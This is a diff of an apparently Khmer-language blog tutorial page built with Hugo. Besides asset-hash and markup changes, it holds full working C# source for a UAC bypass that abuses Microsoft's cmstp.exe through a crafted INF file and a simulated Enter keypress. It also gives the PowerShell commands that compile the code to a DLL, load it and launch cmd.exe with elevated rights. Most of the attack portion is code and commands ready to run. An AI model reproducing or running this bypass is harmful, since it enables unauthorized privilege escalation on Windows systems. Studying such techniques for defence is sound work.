@@ -10,17 +10,17 @@
 
 
   
-  <script defer src="/js/fuse.min.32195737929df2c8096e855a5789cbb3f1331224d9169e8705493e7008f47df8.js"></script>
+  <script defer src="/js/fuse.min.8dfbf8696f107ab8b55732efbb04c5c51576692a4a2cce6effef9f6e92d341a7.js"></script>
 
 
 
-<script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>
+<script src="/js/enquire.min.aa37bdcb743826eecdae5c5d177fc7d6552340f1b4378ffaa9c82b2c6111400b.js"></script>
 
-<script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
+<script defer src="/js/lazysizes.min.498676c34eb225e85357ab0ce19c3c1244f3bd0bf595e5684d1b9d50ea4fbc42.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.1551b6dbdacc77e412a26a29d3b84d2dcdc8f05c3b617433a475dc53c8872bdb.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1359,7 +1359,7 @@
     <meta property="twitter:description" content="Craft a powershell script to bypass uac with dll method.">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.98.0" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1761,7 +1761,7 @@
 <h4 id="c-dll-reflection-code">C# DLL Reflection Code</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -1863,107 +1863,106 @@
 </span><span class="lnt">100
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="cm">/* 
-</span><span class="cm">UAC Bypass using CMSTP.exe microsoft binary.
-</span><span class="cm">Code author: Andre Marques (@_zc00l)
-</span><span class="cm">*/</span>
-<span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.ComponentModel</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Windows</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
-
-<span class="k">public</span> <span class="k">class</span> <span class="nc">CMSTPBypass</span>
-<span class="p">{</span>
-    <span class="c1">// Our .INF file data!
-</span><span class="c1"></span>    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">InfData</span> <span class="p">=</span> <span class="s">@&#34;[version]
-</span><span class="s">Signature=$chicago$
-</span><span class="s">AdvancedINF=2.5
-</span><span class="s">
-</span><span class="s">[DefaultInstall]
-</span><span class="s">CustomDestination=CustInstDestSectionAllUsers
-</span><span class="s">RunPreSetupCommands=RunPreSetupCommandsSection
-</span><span class="s">
-</span><span class="s">[RunPreSetupCommandsSection]
-</span><span class="s">; Commands Here will be run Before Setup Begins to install
-</span><span class="s">REPLACE_COMMAND_LINE
-</span><span class="s">taskkill /IM cmstp.exe /F
-</span><span class="s">
-</span><span class="s">[CustInstDestSectionAllUsers]
-</span><span class="s">49000,49001=AllUSer_LDIDSection, 7
-</span><span class="s">
-</span><span class="s">[AllUSer_LDIDSection]
-</span><span class="s">&#34;&#34;HKLM&#34;&#34;, &#34;&#34;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&#34;&#34;, &#34;&#34;ProfileInstallPath&#34;&#34;, &#34;&#34;%UnexpectedError%&#34;&#34;, &#34;&#34;&#34;&#34;
-</span><span class="s">
-</span><span class="s">[Strings]
-</span><span class="s">ServiceName=&#34;&#34;CorpVPN&#34;&#34;
-</span><span class="s">ShortSvcName=&#34;&#34;CorpVPN&#34;&#34;
-</span><span class="s">
-</span><span class="s">&#34;</span><span class="p">;</span>
-<span class="na">
-</span><span class="na">    [DllImport(&#34;user32.dll&#34;)]</span> <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">ShowWindow</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nCmdShow</span><span class="p">);</span>
-<span class="na">    [DllImport(&#34;user32.dll&#34;, SetLastError = true)]</span> <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">SetForegroundWindow</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">);</span>
-
-    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">BinaryPath</span> <span class="p">=</span> <span class="s">&#34;c:\\windows\\system32\\cmstp.exe&#34;</span><span class="p">;</span>
-
-    <span class="cm">/* Generates a random named .inf file with command to be executed with UAC privileges */</span>
-    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">SetInfFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">CommandToExecute</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="kt">string</span> <span class="n">RandomFileName</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="n">GetRandomFileName</span><span class="p">().</span><span class="n">Split</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">ToChar</span><span class="p">(</span><span class="s">&#34;.&#34;</span><span class="p">))[</span><span class="m">0</span><span class="p">];</span>
-        <span class="kt">string</span> <span class="n">TemporaryDir</span> <span class="p">=</span> <span class="s">&#34;C:\\windows\\temp&#34;</span><span class="p">;</span>
-        <span class="n">StringBuilder</span> <span class="n">OutputFile</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
-        <span class="n">OutputFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">TemporaryDir</span><span class="p">);</span>
-        <span class="n">OutputFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="s">&#34;\\&#34;</span><span class="p">);</span>
-        <span class="n">OutputFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">RandomFileName</span><span class="p">);</span>
-        <span class="n">OutputFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="s">&#34;.inf&#34;</span><span class="p">);</span>
-        <span class="n">StringBuilder</span> <span class="n">newInfData</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">(</span><span class="n">InfData</span><span class="p">);</span>
-        <span class="n">newInfData</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;REPLACE_COMMAND_LINE&#34;</span><span class="p">,</span> <span class="n">CommandToExecute</span><span class="p">);</span>
-        <span class="n">File</span><span class="p">.</span><span class="n">WriteAllText</span><span class="p">(</span><span class="n">OutputFile</span><span class="p">.</span><span class="n">ToString</span><span class="p">(),</span> <span class="n">newInfData</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
-        <span class="k">return</span> <span class="n">OutputFile</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
-    <span class="p">}</span>
-
-    <span class="k">public</span> <span class="k">static</span> <span class="kt">bool</span> <span class="n">Execute</span><span class="p">(</span><span class="kt">string</span> <span class="n">CommandToExecute</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="k">if</span><span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">BinaryPath</span><span class="p">))</span>
-        <span class="p">{</span>
-            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Could not find cmstp.exe binary!&#34;</span><span class="p">);</span>
-            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="n">StringBuilder</span> <span class="n">InfFile</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
-        <span class="n">InfFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">SetInfFile</span><span class="p">(</span><span class="n">CommandToExecute</span><span class="p">));</span>
-
-        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Payload file written to &#34;</span> <span class="p">+</span> <span class="n">InfFile</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
-        <span class="n">ProcessStartInfo</span> <span class="n">startInfo</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ProcessStartInfo</span><span class="p">(</span><span class="n">BinaryPath</span><span class="p">);</span>
-        <span class="n">startInfo</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s">&#34;/au &#34;</span> <span class="p">+</span> <span class="n">InfFile</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
-        <span class="n">startInfo</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
-        <span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">startInfo</span><span class="p">);</span>
-
-        <span class="n">IntPtr</span> <span class="n">windowHandle</span> <span class="p">=</span> <span class="k">new</span> <span class="n">IntPtr</span><span class="p">();</span>
-        <span class="n">windowHandle</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
-        <span class="k">do</span> <span class="p">{</span>
-            <span class="n">windowHandle</span> <span class="p">=</span> <span class="n">SetWindowActive</span><span class="p">(</span><span class="s">&#34;cmstp&#34;</span><span class="p">);</span>
-        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">windowHandle</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
-
-        <span class="n">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span><span class="p">.</span><span class="n">SendKeys</span><span class="p">.</span><span class="n">SendWait</span><span class="p">(</span><span class="s">&#34;{ENTER}&#34;</span><span class="p">);</span>
-        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">public</span> <span class="k">static</span> <span class="n">IntPtr</span> <span class="n">SetWindowActive</span><span class="p">(</span><span class="kt">string</span> <span class="n">ProcessName</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">Process</span><span class="p">[]</span> <span class="n">target</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">GetProcessesByName</span><span class="p">(</span><span class="n">ProcessName</span><span class="p">);</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">Length</span> <span class="p">==</span> <span class="m">0</span><span class="p">)</span> <span class="k">return</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
-        <span class="n">target</span><span class="p">[</span><span class="m">0</span><span class="p">].</span><span class="n">Refresh</span><span class="p">();</span>
-        <span class="n">IntPtr</span> <span class="n">WindowHandle</span> <span class="p">=</span> <span class="k">new</span> <span class="n">IntPtr</span><span class="p">();</span>
-        <span class="n">WindowHandle</span> <span class="p">=</span> <span class="n">target</span><span class="p">[</span><span class="m">0</span><span class="p">].</span><span class="n">MainWindowHandle</span><span class="p">;</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">WindowHandle</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span> <span class="k">return</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
-        <span class="n">SetForegroundWindow</span><span class="p">(</span><span class="n">WindowHandle</span><span class="p">);</span>
-        <span class="n">ShowWindow</span><span class="p">(</span><span class="n">WindowHandle</span><span class="p">,</span> <span class="m">5</span><span class="p">);</span>
-        <span class="k">return</span> <span class="n">WindowHandle</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="cm">/* 
+</span></span></span><span class="line"><span class="cl"><span class="cm">UAC Bypass using CMSTP.exe microsoft binary.
+</span></span></span><span class="line"><span class="cl"><span class="cm">Code author: Andre Marques (@_zc00l)
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.ComponentModel</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Windows</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">class</span> <span class="nc">CMSTPBypass</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Our .INF file data!</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">InfData</span> <span class="p">=</span> <span class="s">@&#34;[version]
+</span></span></span><span class="line"><span class="cl"><span class="s">Signature=$chicago$
+</span></span></span><span class="line"><span class="cl"><span class="s">AdvancedINF=2.5
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">[DefaultInstall]
+</span></span></span><span class="line"><span class="cl"><span class="s">CustomDestination=CustInstDestSectionAllUsers
+</span></span></span><span class="line"><span class="cl"><span class="s">RunPreSetupCommands=RunPreSetupCommandsSection
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">[RunPreSetupCommandsSection]
+</span></span></span><span class="line"><span class="cl"><span class="s">; Commands Here will be run Before Setup Begins to install
+</span></span></span><span class="line"><span class="cl"><span class="s">REPLACE_COMMAND_LINE
+</span></span></span><span class="line"><span class="cl"><span class="s">taskkill /IM cmstp.exe /F
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">[CustInstDestSectionAllUsers]
+</span></span></span><span class="line"><span class="cl"><span class="s">49000,49001=AllUSer_LDIDSection, 7
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">[AllUSer_LDIDSection]
+</span></span></span><span class="line"><span class="cl"><span class="s">&#34;&#34;HKLM&#34;&#34;, &#34;&#34;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&#34;&#34;, &#34;&#34;ProfileInstallPath&#34;&#34;, &#34;&#34;%UnexpectedError%&#34;&#34;, &#34;&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">[Strings]
+</span></span></span><span class="line"><span class="cl"><span class="s">ServiceName=&#34;&#34;CorpVPN&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">ShortSvcName=&#34;&#34;CorpVPN&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s">
+</span></span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">    [DllImport(&#34;user32.dll&#34;)]</span> <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">ShowWindow</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nCmdShow</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="na">    [DllImport(&#34;user32.dll&#34;, SetLastError = true)]</span> <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">SetForegroundWindow</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hWnd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">BinaryPath</span> <span class="p">=</span> <span class="s">&#34;c:\\windows\\system32\\cmstp.exe&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Generates a random named .inf file with command to be executed with UAC privileges */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">SetInfFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">CommandToExecute</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="n">RandomFileName</span> <span class="p">=</span> <span class="n">Path</span><span class="p">.</span><span class="n">GetRandomFileName</span><span class="p">().</span><span class="n">Split</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">ToChar</span><span class="p">(</span><span class="s">&#34;.&#34;</span><span class="p">))[</span><span class="m">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="n">TemporaryDir</span> <span class="p">=</span> <span class="s">&#34;C:\\windows\\temp&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StringBuilder</span> <span class="n">OutputFile</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">OutputFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">TemporaryDir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">OutputFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="s">&#34;\\&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">OutputFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">RandomFileName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">OutputFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="s">&#34;.inf&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StringBuilder</span> <span class="n">newInfData</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">(</span><span class="n">InfData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">newInfData</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s">&#34;REPLACE_COMMAND_LINE&#34;</span><span class="p">,</span> <span class="n">CommandToExecute</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">File</span><span class="p">.</span><span class="n">WriteAllText</span><span class="p">(</span><span class="n">OutputFile</span><span class="p">.</span><span class="n">ToString</span><span class="p">(),</span> <span class="n">newInfData</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">OutputFile</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="kt">bool</span> <span class="n">Execute</span><span class="p">(</span><span class="kt">string</span> <span class="n">CommandToExecute</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">BinaryPath</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Could not find cmstp.exe binary!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StringBuilder</span> <span class="n">InfFile</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">InfFile</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="n">SetInfFile</span><span class="p">(</span><span class="n">CommandToExecute</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Payload file written to &#34;</span> <span class="p">+</span> <span class="n">InfFile</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ProcessStartInfo</span> <span class="n">startInfo</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ProcessStartInfo</span><span class="p">(</span><span class="n">BinaryPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">startInfo</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s">&#34;/au &#34;</span> <span class="p">+</span> <span class="n">InfFile</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">startInfo</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="n">startInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">IntPtr</span> <span class="n">windowHandle</span> <span class="p">=</span> <span class="k">new</span> <span class="n">IntPtr</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">windowHandle</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">windowHandle</span> <span class="p">=</span> <span class="n">SetWindowActive</span><span class="p">(</span><span class="s">&#34;cmstp&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">windowHandle</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span><span class="p">.</span><span class="n">SendKeys</span><span class="p">.</span><span class="n">SendWait</span><span class="p">(</span><span class="s">&#34;{ENTER}&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="n">IntPtr</span> <span class="n">SetWindowActive</span><span class="p">(</span><span class="kt">string</span> <span class="n">ProcessName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Process</span><span class="p">[]</span> <span class="n">target</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">GetProcessesByName</span><span class="p">(</span><span class="n">ProcessName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">Length</span> <span class="p">==</span> <span class="m">0</span><span class="p">)</span> <span class="k">return</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">target</span><span class="p">[</span><span class="m">0</span><span class="p">].</span><span class="n">Refresh</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IntPtr</span> <span class="n">WindowHandle</span> <span class="p">=</span> <span class="k">new</span> <span class="n">IntPtr</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WindowHandle</span> <span class="p">=</span> <span class="n">target</span><span class="p">[</span><span class="m">0</span><span class="p">].</span><span class="n">MainWindowHandle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">WindowHandle</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span> <span class="k">return</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">SetForegroundWindow</span><span class="p">(</span><span class="n">WindowHandle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ShowWindow</span><span class="p">(</span><span class="n">WindowHandle</span><span class="p">,</span> <span class="m">5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">WindowHandle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
 <p><span style="color:grey">ផ្អែកលើការងារពីមុនរបស់លោក</span> <a href="https://oddvar.moe/2017/08/15/research-on-cmstp-exe/">Oddvar Moe</a><br />
@@ -1972,10 +1971,10 @@
 ដើម្បីបំប្លែងកូដទៅជាឯកសារ dll យើងអាចប្រើពាក្យបញ្ជានៅលើ powershell ដូចខាងក្រោម៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Add-Type</span> <span class="n">-TypeDefinition</span> <span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllText</span><span class="p">(</span><span class="s2">&#34;$pwd\Source.cs&#34;</span><span class="p">))</span> <span class="n">-ReferencedAssemblies</span> <span class="s2">&#34;System.Windows.Forms&#34;</span> <span class="n">-OutputAssembly</span> <span class="s2">&#34;CMSTP-UAC-Bypass.dll&#34;</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Add-Type</span> <span class="n">-TypeDefinition</span> <span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllText</span><span class="p">(</span><span class="s2">&#34;$pwd\Source.cs&#34;</span><span class="p">))</span> <span class="n">-ReferencedAssemblies</span> <span class="s2">&#34;System.Windows.Forms&#34;</span> <span class="n">-OutputAssembly</span> <span class="s2">&#34;CMSTP-UAC-Bypass.dll&#34;</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
 <p>ក្រោយបំប្លែងរួចវានឹងបង្កើតចេញជាឯកសារមួយមានឈ្មោះថា <span style="color:red">&ldquo;CMSTP-UAC-Bypass.dll&rdquo;</span></p>
@@ -1983,7 +1982,7 @@
 <p>ដើម្បីប្រើប្រាស់ឯកសារ dll ដែលបានបង្កើតរួចឲ្យដំណើរការ Bypass UAC យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1992,13 +1991,13 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">Load</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&#34;$pwd\CMSTP-UAC-Bypass.dll&#34;</span><span class="p">))</span>
-
-<span class="n">GAC</span>    <span class="n">Version</span>        <span class="n">Location</span>
-<span class="p">---</span>    <span class="p">-------</span>        <span class="p">--------</span>
-<span class="n">False</span>  <span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span>
-
-<span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="no">[CMSTPBypass]</span><span class="p">::</span><span class="n">Execute</span><span class="p">(</span><span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span><span class="p">)</span></code></pre></td></tr></table>
